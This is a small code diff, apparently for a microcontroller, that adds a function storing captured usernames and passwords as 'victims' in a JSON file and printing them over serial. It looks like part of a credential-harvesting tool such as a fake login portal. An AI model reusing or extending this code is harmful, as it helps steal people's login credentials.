@@ -18,6 +18,22 @@ public:
         deserializeJson(doc, victimsFullText);
     }
 
+    void addVictimJsonText(String jsonText){
+        JsonDocument docTemp; 
+        deserializeJson(docTemp, jsonText);
+
+        JsonObject victim = doc["victims"].add<JsonObject>();
+        
+        victim["username"] = docTemp["username"];
+        victim["password"] = docTemp["password"];
+
+        String out;
+        serializeJson(doc, out);
+        Serial.println(out);
+        arquivo->writeFile(out);
+    }
+
+
     void addVictim(String user, String pass){
         JsonObject victim = doc["victims"].add<JsonObject>();
         victim["username"] = user;
